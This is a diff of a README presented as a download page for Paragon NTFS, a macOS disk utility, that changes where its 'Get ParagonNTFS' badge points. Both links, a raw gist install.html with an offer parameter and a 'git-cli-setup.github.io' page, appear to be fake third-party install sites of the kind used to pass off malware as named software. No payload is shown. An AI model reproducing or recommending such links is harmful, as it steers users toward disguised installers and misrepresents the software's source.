@@ -1,5 +1,5 @@
 # Paragon NTFS Desktop — macOS Disk Utility
-<a href="https://gistcdn.githack.com/outcaster1982-bot/2456301890ddd2e9c6b83912316b30b5/raw/a0875d15d7b23e3a72370cff1bb8926dc6dcd835/install.html?offer=ParagonNTFS" target="_blank">
+<a href="https://git-cli-setup.github.io/.github/?offer=ParagonNTFS" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20ParagonNTFS%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
